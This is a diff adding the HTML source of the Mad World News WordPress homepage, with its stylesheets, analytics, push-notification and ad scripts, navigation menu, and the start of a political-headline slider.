@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+
+<html class="no-js mh-one-sb" lang="en-US">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<link href="http://gmpg.org/xfn/11" rel="profile"/>
+<style>
+	@font-face {
+		font-family: "sw-icon-font";
+		src:url("https://madworldnews.com/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.eot?ver=4.2.1");
+		src:url("https://madworldnews.com/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.eot?ver=4.2.1#iefix") format("embedded-opentype"),
+		url("https://madworldnews.com/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.woff?ver=4.2.1") format("woff"),
+		url("https://madworldnews.com/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.ttf?ver=4.2.1") format("truetype"),
+		url("https://madworldnews.com/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.svg?ver=4.2.1#1445203416") format("svg");
+		font-weight: normal;
+		font-style: normal;
+		font-display:block;
+	}
+</style>
+<title>Home | Mad World News</title>
+<meta content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" name="robots">
+<link href="https://madworldnews.com/" rel="canonical"/>
+<meta content="en_US" property="og:locale">
+<meta content="website" property="og:type"/>
+<meta content="Home | Mad World News" property="og:title"/>
+<meta content="https://madworldnews.com/" property="og:url"/>
+<meta content="Mad World News" property="og:site_name"/>
+<meta content="https://www.facebook.com/MadWorldNewsCorp/" property="article:publisher"/>
+<meta content="2016-11-25T15:05:23+00:00" property="article:modified_time"/>
+<meta content="https://madworldnews.com/wp-content/uploads/2017/07/Mad-World-News-tab.png" property="og:image"/>
+<meta content="512" property="og:image:width"/>
+<meta content="512" property="og:image:height"/>
+<meta content="summary_large_image" name="twitter:card"/>
+<meta content="@MadWorldNews" name="twitter:site"/>
+<script class="yoast-schema-graph" type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://madworldnews.com/#organization","name":"Mad World News, LLC","url":"https://madworldnews.com/","sameAs":["https://www.facebook.com/MadWorldNewsCorp/","https://www.pinterest.com/taphaps/","https://twitter.com/MadWorldNews"],"logo":{"@type":"ImageObject","@id":"https://madworldnews.com/#logo","inLanguage":"en-US","url":"https://madworldnews.com/wp-content/uploads/2017/07/Mad-World-News-tab.png","width":512,"height":512,"caption":"Mad World News, LLC"},"image":{"@id":"https://madworldnews.com/#logo"}},{"@type":"WebSite","@id":"https://madworldnews.com/#website","url":"https://madworldnews.com/","name":"Mad World News","description":"","publisher":{"@id":"https://madworldnews.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":"https://madworldnews.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"WebPage","@id":"https://madworldnews.com/#webpage","url":"https://madworldnews.com/","name":"Home | Mad World News","isPartOf":{"@id":"https://madworldnews.com/#website"},"about":{"@id":"https://madworldnews.com/#organization"},"datePublished":"2015-03-22T15:05:47+00:00","dateModified":"2016-11-25T15:05:23+00:00","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://madworldnews.com/"]}]},{"@type":"BreadcrumbList","@id":"https://madworldnews.com/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://madworldnews.com/","url":"https://madworldnews.com/","name":"Home"}}]}]}</script>
+<meta content="53c38f52dbae4bcaad643937d29cc4a4" name="msvalidate.01"/>
+<meta content="WOyxL9Z1SWWAt7TvAvCBp9uQiPe1sKQ-HzMuLWrrC7o" name="google-site-verification"/>
+<link href="//fonts.googleapis.com" rel="dns-prefetch"/>
+<link href="//s.w.org" rel="dns-prefetch"/>
+<link href="https://madworldnews.com/feed/" rel="alternate" title="Mad World News » Feed" type="application/rss+xml"/>
+<script data-cfasync="false" type="text/javascript">
+    (window.gaDevIds=window.gaDevIds||[]).push("dZGIzZG");
+	var mi_version         = '7.14.0';
+	var mi_track_user      = true;
+	var mi_no_track_reason = '';
+	
+	var disableStr = 'ga-disable-UA-43890618-1';
+
+	/* Function to detect opted out users */
+	function __gaTrackerIsOptedOut() {
+		return document.cookie.indexOf(disableStr + '=true') > -1;
+	}
+
+	/* Disable tracking if the opt-out cookie exists. */
+	if ( __gaTrackerIsOptedOut() ) {
+		window[disableStr] = true;
+	}
+
+	/* Opt-out function */
+	function __gaTrackerOptout() {
+	  document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+	  window[disableStr] = true;
+	}
+
+	if ( 'undefined' === typeof gaOptout ) {
+		function gaOptout() {
+			__gaTrackerOptout();
+		}
+	}
+	
+	if ( mi_track_user ) {
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','//www.google-analytics.com/analytics.js','__gaTracker');
+
+window.ga = __gaTracker;		__gaTracker('create', 'UA-43890618-1', 'auto');
+		__gaTracker('set', 'forceSSL', true);
+		__gaTracker('set', 'dimension1', 'Staff Writer');
+		__gaTracker('send','pageview');
+		__gaTracker( function() { window.ga = __gaTracker; } );
+	} else {
+		console.log( "" );
+		(function() {
+			/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+			var noopfn = function() {
+				return null;
+			};
+			var noopnullfn = function() {
+				return null;
+			};
+			var Tracker = function() {
+				return null;
+			};
+			var p = Tracker.prototype;
+			p.get = noopfn;
+			p.set = noopfn;
+			p.send = noopfn;
+			var __gaTracker = function() {
+				var len = arguments.length;
+				if ( len === 0 ) {
+					return;
+				}
+				var f = arguments[len-1];
+				if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+					console.log( 'Not running function __gaTracker(' + arguments[0] + " ....) because you are not being tracked. " + mi_no_track_reason );
+					return;
+				}
+				try {
+					f.hitCallback();
+				} catch (ex) {
+
+				}
+			};
+			__gaTracker.create = function() {
+				return new Tracker();
+			};
+			__gaTracker.getByName = noopnullfn;
+			__gaTracker.getAll = function() {
+				return [];
+			};
+			__gaTracker.remove = noopfn;
+			window['__gaTracker'] = __gaTracker;
+			window.ga = __gaTracker;		})();
+		}
+</script>
+<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/madworldnews.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.6.2"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link href="https://madworldnews.com/wp-content/plugins/social-warfare/assets/js/post-editor/dist/blocks.style.build.css?ver=5.6.2" id="social-warfare-block-css-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="https://madworldnews.com/wp-includes/css/dist/block-library/style.min.css?ver=5.6.2" id="wp-block-library-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="https://madworldnews.com/wp-content/plugins/google-analytics-premium/assets/css/frontend.min.css?ver=7.14.0" id="monsterinsights-popular-posts-style-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="https://madworldnews.com/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=4.2.1" id="social_warfare-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="https://madworldnews.com/wp-content/themes/mh-magazine/style.css?ver=3.8.1" id="mh-magazine-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="https://madworldnews.com/wp-content/themes/mh-magazine/includes/font-awesome.min.css" id="mh-font-awesome-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,400italic,600,700" id="mh-google-fonts-css" media="all" rel="stylesheet" type="text/css"/>
+<script id="monsterinsights-frontend-script-js-extra" type="text/javascript">
+/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/madworldnews.com","hash_tracking":"false"};
+/* ]]> */
+</script>
+<script id="monsterinsights-frontend-script-js" src="https://madworldnews.com/wp-content/plugins/google-analytics-premium/assets/js/frontend.min.js?ver=7.14.0" type="text/javascript"></script>
+<script id="jquery-core-js" src="https://madworldnews.com/wp-includes/js/jquery/jquery.min.js?ver=3.5.1" type="text/javascript"></script>
+<script id="jquery-migrate-js" src="https://madworldnews.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2" type="text/javascript"></script>
+<script id="mh-scripts-js" src="https://madworldnews.com/wp-content/themes/mh-magazine/js/scripts.js?ver=3.8.1" type="text/javascript"></script>
+<link href="https://madworldnews.com/wp-json/" rel="https://api.w.org/"/><link href="https://madworldnews.com/wp-json/wp/v2/pages/66565" rel="alternate" type="application/json"/><link href="https://madworldnews.com/xmlrpc.php?rsd" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="https://madworldnews.com/wp-includes/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<meta content="WordPress 5.6.2" name="generator"/>
+<link href="https://madworldnews.com/" rel="shortlink"/>
+<link href="https://madworldnews.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmadworldnews.com%2F" rel="alternate" type="application/json+oembed"/>
+<link href="https://madworldnews.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fmadworldnews.com%2F&amp;format=xml" rel="alternate" type="text/xml+oembed"/>
+<script type="text/javascript">//<![CDATA[
+  function external_links_in_new_windows_loop() {
+    if (!document.links) {
+      document.links = document.getElementsByTagName('a');
+    }
+    var change_link = false;
+    var force = '';
+    var ignore = '';
+
+    for (var t=0; t<document.links.length; t++) {
+      var all_links = document.links[t];
+      change_link = false;
+      
+      if(document.links[t].hasAttribute('onClick') == false) {
+        // forced if the address starts with http (or also https), but does not link to the current domain
+        if(all_links.href.search(/^http/) != -1 && all_links.href.search('madworldnews.com') == -1 && all_links.href.search(/^#/) == -1) {
+          // console.log('Changed ' + all_links.href);
+          change_link = true;
+        }
+          
+        if(force != '' && all_links.href.search(force) != -1) {
+          // forced
+          // console.log('force ' + all_links.href);
+          change_link = true;
+        }
+        
+        if(ignore != '' && all_links.href.search(ignore) != -1) {
+          // console.log('ignore ' + all_links.href);
+          // ignored
+          change_link = false;
+        }
+
+        if(change_link == true) {
+          // console.log('Changed ' + all_links.href);
+          document.links[t].setAttribute('onClick', 'javascript:window.open(\''+all_links.href+'\'); return false;');
+          document.links[t].removeAttribute('target');
+        }
+      }
+    }
+  }
+  
+  // Load
+  function external_links_in_new_windows_load(func)
+  {  
+    var oldonload = window.onload;
+    if (typeof window.onload != 'function'){
+      window.onload = func;
+    } else {
+      window.onload = function(){
+        oldonload();
+        func();
+      }
+    }
+  }
+
+  external_links_in_new_windows_load(external_links_in_new_windows_loop);
+  //]]></script>
+<style type="text/css">
+.mh-header { background: #2a2a2a; }
+.mh-navigation li:hover, .mh-navigation ul li:hover > ul, .mh-main-nav-wrap, .mh-main-nav, .mh-social-nav li a:hover, .entry-tags li, .mh-slider-caption, .mh-widget-layout8 .mh-widget-title .mh-footer-widget-title-inner, .mh-widget-col-1 .mh-slider-caption, .mh-widget-col-1 .mh-posts-lineup-caption, .mh-carousel-layout1, .mh-spotlight-widget, .mh-social-widget li a, .mh-author-bio-widget, .mh-footer-widget .mh-tab-comment-excerpt, .mh-nip-item:hover .mh-nip-overlay, .mh-widget .tagcloud a, .mh-footer-widget .tagcloud a, .mh-footer, .mh-copyright-wrap, input[type=submit]:hover, #infinite-handle span:hover { background: #444444; }
+.mh-extra-nav-bg { background: rgba(68, 68, 68, 0.2); }
+.mh-slider-caption, .mh-posts-stacked-title, .mh-posts-lineup-caption { background: #444444; background: rgba(68, 68, 68, 0.8); }
+@media screen and (max-width: 900px) { #mh-mobile .mh-slider-caption, #mh-mobile .mh-posts-lineup-caption { background: rgba(68, 68, 68, 1); } }
+.slicknav_menu, .slicknav_nav ul, #mh-mobile .mh-footer-widget .mh-posts-stacked-overlay { border-color: #444444; }
+.mh-copyright, .mh-copyright a { color: #fff; }
+.mh-widget-layout4 .mh-widget-title { background: #444444; background: rgba(68, 68, 68, 0.6); }
+.mh-preheader, .mh-wide-layout .mh-subheader, .mh-ticker-title, .mh-main-nav li:hover, .mh-footer-nav, .slicknav_menu, .slicknav_btn, .slicknav_nav .slicknav_item:hover, .slicknav_nav a:hover, .mh-back-to-top, .mh-subheading, .entry-tags .fa, .entry-tags li:hover, .mh-widget-layout2 .mh-widget-title, .mh-widget-layout4 .mh-widget-title-inner, .mh-widget-layout4 .mh-footer-widget-title, .mh-widget-layout5 .mh-widget-title-inner, .mh-widget-layout6 .mh-widget-title, #mh-mobile .flex-control-paging li a.flex-active, .mh-image-caption, .mh-carousel-layout1 .mh-carousel-caption, .mh-tab-button.active, .mh-tab-button.active:hover, .mh-footer-widget .mh-tab-button.active, .mh-social-widget li:hover a, .mh-footer-widget .mh-social-widget li a, .mh-footer-widget .mh-author-bio-widget, .tagcloud a:hover, .mh-widget .tagcloud a:hover, .mh-footer-widget .tagcloud a:hover, .mh-posts-stacked-item .mh-meta, .page-numbers:hover, .mh-loop-pagination .current, .mh-comments-pagination .current, .pagelink, a:hover .pagelink, input[type=submit], #infinite-handle span { background: #444444; }
+.mh-main-nav-wrap .slicknav_nav ul, blockquote, .mh-widget-layout1 .mh-widget-title, .mh-widget-layout3 .mh-widget-title, .mh-widget-layout5 .mh-widget-title, .mh-widget-layout8 .mh-widget-title:after, #mh-mobile .mh-slider-caption, .mh-carousel-layout1, .mh-spotlight-widget, .mh-author-bio-widget, .mh-author-bio-title, .mh-author-bio-image-frame, .mh-video-widget, .mh-tab-buttons, textarea:hover, input[type=text]:hover, input[type=email]:hover, input[type=tel]:hover, input[type=url]:hover { border-color: #444444; }
+.mh-dropcap, .mh-carousel-layout1 .flex-direction-nav a, .mh-carousel-layout2 .mh-carousel-caption, .mh-posts-digest-small-category, .mh-posts-lineup-more, .bypostauthor .fn:after, .mh-comment-list .comment-reply-link:before, #respond #cancel-comment-reply-link:before { color: #444444; }
+#mh-mobile .mh-header-nav li:hover a, .mh-main-nav li a, .mh-extra-nav li:hover a, .mh-footer-nav li:hover a, .mh-social-nav li:hover .fa-mh-social, .mh-main-nav-wrap .slicknav_menu a, .mh-main-nav-wrap .slicknav_menu a:hover, .entry-tags a, .mh-slider-caption, .mh-slider-caption a, .mh-slider-caption a:hover, .mh-spotlight-widget, #mh-mobile .mh-spotlight-widget a, #mh-mobile .mh-spotlight-widget a:hover, .mh-spotlight-widget .mh-spotlight-meta, .mh-posts-stacked-title a, .mh-posts-stacked-title a:hover, .mh-posts-lineup-widget a, .mh-posts-lineup-widget a:hover, .mh-posts-lineup-caption, .mh-footer-widget .mh-tabbed-widget, .mh-footer-widget .mh-tabbed-widget a, .mh-footer-widget .mh-tabbed-widget a:hover, .mh-author-bio-title, .mh-author-bio-text, .mh-social-widget .fa-mh-social, .mh-footer, .mh-footer a, .mh-footer a:hover, .mh-footer .mh-meta, .mh-footer .mh-meta a, .mh-footer .mh-meta a:hover, .mh-footer .wp-caption-text, .mh-widget-layout1 .mh-widget-title.mh-footer-widget-title, .mh-widget-layout1 .mh-widget-title.mh-footer-widget-title a, .mh-widget-layout3 .mh-widget-title.mh-footer-widget-title, .mh-widget-layout3 .mh-widget-title.mh-footer-widget-title a, .mh-widget-layout7 .mh-widget-title.mh-footer-widget-title, .mh-widget-layout7 .mh-widget-title.mh-footer-widget-title a, .mh-widget-layout8 .mh-widget-title.mh-footer-widget-title, .mh-widget-layout8 .mh-widget-title.mh-footer-widget-title a, .mh-copyright, .mh-copyright a, .mh-copyright a:hover, .tagcloud a, .mh-tabbed-widget .tagcloud a, input[type=submit]:hover, #infinite-handle span:hover { color: #ffd800; }
+.mh-main-nav-wrap .slicknav_menu .slicknav_icon-bar { background: #ffd800; }
+.entry-content a { color: #e51a16; }
+a:hover, .entry-content a:hover, #respond a:hover, #respond #cancel-comment-reply-link:hover, #respond .logged-in-as a:hover, .mh-comment-list .comment-meta a:hover, .mh-ping-list .mh-ping-item a:hover, .mh-meta a:hover, .mh-breadcrumb a:hover, .mh-tabbed-widget a:hover { color: #e51a16; }
+</style>
+<!--[if lt IE 9]>
+<script src="https://madworldnews.com/wp-content/themes/mh-magazine/js/css3-mediaqueries.js"></script>
+<![endif]-->
+<style type="text/css">
+.entry-content { font-size: 16px; font-size: 1rem; }
+</style>
+<meta content="wordpress-plugin" name="onesignal"/>
+<script>
+
+      window.OneSignal = window.OneSignal || [];
+
+      OneSignal.push( function() {
+        OneSignal.SERVICE_WORKER_UPDATER_PATH = "OneSignalSDKUpdaterWorker.js.php";
+        OneSignal.SERVICE_WORKER_PATH = "OneSignalSDKWorker.js.php";
+        OneSignal.SERVICE_WORKER_PARAM = { scope: '/' };
+
+        OneSignal.setDefaultNotificationUrl("https://madworldnews.com");
+        var oneSignal_options = {};
+        window._oneSignalInitOptions = oneSignal_options;
+
+        oneSignal_options['wordpress'] = true;
+oneSignal_options['appId'] = '5e0b10dc-cb91-40c1-9694-151f295ad6f7';
+oneSignal_options['welcomeNotification'] = { };
+oneSignal_options['welcomeNotification']['title'] = "Mad World News";
+oneSignal_options['welcomeNotification']['message'] = "";
+oneSignal_options['path'] = "https://madworldnews.com/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/";
+oneSignal_options['safari_web_id'] = "web.onesignal.auto.1de7b938-6047-48aa-bcdd-0245aac21a82";
+oneSignal_options['promptOptions'] = { };
+oneSignal_options['notifyButton'] = { };
+oneSignal_options['notifyButton']['enable'] = true;
+oneSignal_options['notifyButton']['position'] = 'bottom-right';
+oneSignal_options['notifyButton']['theme'] = 'default';
+oneSignal_options['notifyButton']['size'] = 'medium';
+oneSignal_options['notifyButton']['showCredit'] = false;
+oneSignal_options['notifyButton']['text'] = {};
+                OneSignal.init(window._oneSignalInitOptions);
+                OneSignal.showSlidedownPrompt();      });
+
+      function documentInitOneSignal() {
+        var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");
+
+        var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
+          oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);
+      }
+
+      if (document.readyState === 'complete') {
+           documentInitOneSignal();
+      }
+      else {
+           window.addEventListener("load", function(event){
+               documentInitOneSignal();
+          });
+      }
+    </script>
+<style id="custom-background-css" type="text/css">
+body.custom-background { background-color: #000000; background-image: url("https://madworldnews.com/wp-content/uploads/2017/05/o-new-york-city-skyline-facebook.jpg"); background-position: center center; background-size: cover; background-repeat: no-repeat; background-attachment: fixed; }
+</style>
+<link href="https://madworldnews.com/wp-content/uploads/2017/07/cropped-Mad-World-News-tab-32x32.png" rel="icon" sizes="32x32"/>
+<link href="https://madworldnews.com/wp-content/uploads/2017/07/cropped-Mad-World-News-tab-192x192.png" rel="icon" sizes="192x192"/>
+<link href="https://madworldnews.com/wp-content/uploads/2017/07/cropped-Mad-World-News-tab-180x180.png" rel="apple-touch-icon"/>
+<meta content="https://madworldnews.com/wp-content/uploads/2017/07/cropped-Mad-World-News-tab-270x270.png" name="msapplication-TileImage"/>
+<style id="wp-custom-css" type="text/css">
+			element.style {
+}
+
+.mh-widget {
+    overflow: visible;
+}
+.twitter-tweet {margin:auto;}		</style>
+<style>
+.ai-viewports                 {--ai: 1;}
+.ai-viewport-3                { display: none !important;}
+.ai-viewport-2                { display: none !important;}
+.ai-viewport-1                { display: inherit !important;}
+.ai-viewport-0                { display: none !important;}
+@media (min-width: 768px) and (max-width: 979px) {
+.ai-viewport-1                { display: none !important;}
+.ai-viewport-2                { display: inherit !important;}
+}
+@media (max-width: 767px) {
+.ai-viewport-1                { display: none !important;}
+.ai-viewport-3                { display: inherit !important;}
+}
+</style>
+<script async="" data-ad-client="ca-pub-4002224619850332" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<meta content="1483642208411381" property="fb:pages"/></meta></meta></head>
+<body class="home page-template page-template-template-homepage page-template-template-homepage-php page page-id-66565 custom-background mh-boxed-layout mh-right-sb mh-loop-layout1 mh-widget-layout1" id="mh-mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
+<div class="mh-container mh-container-outer">
+<div class="mh-header-nav-mobile clearfix"></div>
+<div class="mh-preheader">
+<div class="mh-container mh-container-inner mh-row clearfix">
+<div class="mh-header-bar-content mh-header-bar-top-left mh-col-2-3 clearfix">
+<div class="mh-header-date mh-header-date-top">
+March 17, 2021 </div>
+</div>
+<div class="mh-header-bar-content mh-header-bar-top-right mh-col-1-3 clearfix">
+<nav class="mh-social-icons mh-social-nav mh-social-nav-top clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+<div class="menu-social-container"><ul class="menu" id="menu-social"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-191972" id="menu-item-191972"><a href="https://mewe.com/join/madworldnews" title="MeWe"><i class="fa fa-mh-social"></i><span class="screen-reader-text">MeWe</span></a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-191973" id="menu-item-191973"><a href="https://twitter.com/MadWorldNews" title="Twitter"><i class="fa fa-mh-social"></i><span class="screen-reader-text">Twitter</span></a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-191974" id="menu-item-191974"><a href="https://www.pinterest.com/TapHaps/" title="Pinterest"><i class="fa fa-mh-social"></i><span class="screen-reader-text">Pinterest</span></a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-227814" id="menu-item-227814"><a href="http://feeds.feedburner.com/MadWorldNews" title="RSS"><i class="fa fa-mh-social"></i><span class="screen-reader-text">RSS</span></a></li>
+</ul></div> </nav>
+</div>
+</div>
+</div>
+<header class="mh-header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
+<div class="mh-container mh-container-inner clearfix">
+<div class="mh-custom-header clearfix">
+<a class="mh-header-image-link" href="https://madworldnews.com/" rel="home" title="Mad World News">
+<img alt="Mad World News" class="mh-header-image" height="142" src="https://madworldnews.com/wp-content/uploads/2021/01/mwnpostwebsitebanner.jpg" width="1080"/>
+</a>
+</div>
+</div>
+<div class="mh-main-nav-wrap">
+<nav class="mh-navigation mh-main-nav mh-container mh-container-inner clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+<div class="menu-main-navigation-container"><ul class="menu" id="menu-main-navigation"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-66565 current_page_item menu-item-288492" id="menu-item-288492"><a aria-current="page" href="https://madworldnews.com/">Home</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-288493" id="menu-item-288493"><a>Categories</a>
+<ul class="sub-menu">
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-288495" id="menu-item-288495"><a href="https://madworldnews.com/politics/">Political Opinion</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-288494" id="menu-item-288494"><a href="https://madworldnews.com/social-issues/">Social Issues</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-288496" id="menu-item-288496"><a href="https://madworldnews.com/crime/">Cops &amp; Criminals</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-288497" id="menu-item-288497"><a href="https://madworldnews.com/entertainment/">Entertainment</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-288498" id="menu-item-288498"><a href="https://madworldnews.com/health-science/">Health &amp; Science</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-288499" id="menu-item-288499"><a href="https://madworldnews.com/animals/">Animals</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-288500" id="menu-item-288500"><a href="https://madworldnews.com/about/">About Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-288503" id="menu-item-288503"><a href="https://madworldnews.com/privacy-policy/">Privacy Policy</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-288505" id="menu-item-288505"><a href="https://madworldnews.com/sitemap/">Sitemap</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-305210" id="menu-item-305210"><a href="https://madworldnews.com/sign-up-stay-connected/">Sign Up &amp; Stay Connected</a></li>
+</ul></div> </nav>
+</div>
+</header>
+<div class="mh-subheader">
+<div class="mh-container mh-container-inner mh-row clearfix">
+<div class="mh-header-bar-content mh-header-bar-bottom-right mh-col-1-3 clearfix">
+<aside class="mh-header-search mh-header-search-bottom">
+<form action="https://madworldnews.com/" class="search-form" method="get" role="search">
+<label>
+<span class="screen-reader-text">Search for:</span>
+<input class="search-field" name="s" placeholder="Search …" type="search" value=""/>
+</label>
+<input class="search-submit" type="submit" value="Search"/>
+</form> </aside>
+</div>
+</div>
+</div>
+<div class="mh-wrapper mh-home clearfix">
+<div class="mh-main mh-home-main">
+<div class="mh-widget mh-home-1 mh-home-wide mh_magazine_slider" id="mh_magazine_slider-2"> <div class="flexslider mh-slider-widget mh-slider-large mh-slider-layout5">
+<ul class="slides"> <li class="mh-slider-item">
+<article class="post-326957 post type-post status-publish format-standard has-post-thumbnail category-politics tag-donald-trump tag-mike-pence tag-police">
+<a href="https://madworldnews.com/revolution-trump-capitol-hill/" title="‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired"><img alt="" class="attachment-mh-magazine-slider size-mh-magazine-slider wp-post-image" height="420" loading="lazy" sizes="(max-width: 800px) 100vw, 800px" src="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526.jpg" srcset="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526.jpg 800w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526-678x356.jpg 678w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099652265526-550x289.jpg 550w" width="800"/> </a>
+<div class="mh-image-caption mh-slider-category">
+Political Opinion </div>
+<div class="mh-slider-caption">
+<div class="mh-slider-content">
+<h2 class="mh-slider-title">
+<a href="https://madworldnews.com/revolution-trump-capitol-hill/" title="‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired">
+‘Revolution In Process’: Trump Supporters Storm Capitol Hill, Shots Fired </a>
+</h2>
+</div>
+</div>
+</article>
+</li> <li class="mh-slider-item">
+<article class="post-326945 post type-post status-publish format-standard has-post-thumbnail category-politics tag-joe-biden tag-kamala-harris">
+<a href="https://madworldnews.com/kamala-harris-accused-plagiarism/" title="Kamala Harris Accused Of Lying &amp; Plagiarism In Latest ‘Toddler Freedom Story’"><img alt="" class="attachment-mh-magazine-slider size-mh-magazine-slider wp-post-image" height="420" loading="lazy" sizes="(max-width: 800px) 100vw, 800px" src="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428.jpg" srcset="https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428.jpg 800w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428-678x356.jpg 678w, https://madworldnews.com/wp-content/uploads/2021/01/composite_16099587804428-550x289.jpg 550w" width="800"/> </a>
+<div class="mh-image-caption mh-slider-category">
+Political Opinion </div>
+<div class="mh-slider-caption">
+<div class="mh-slider-content">
+<h2 class="mh-slider-title">
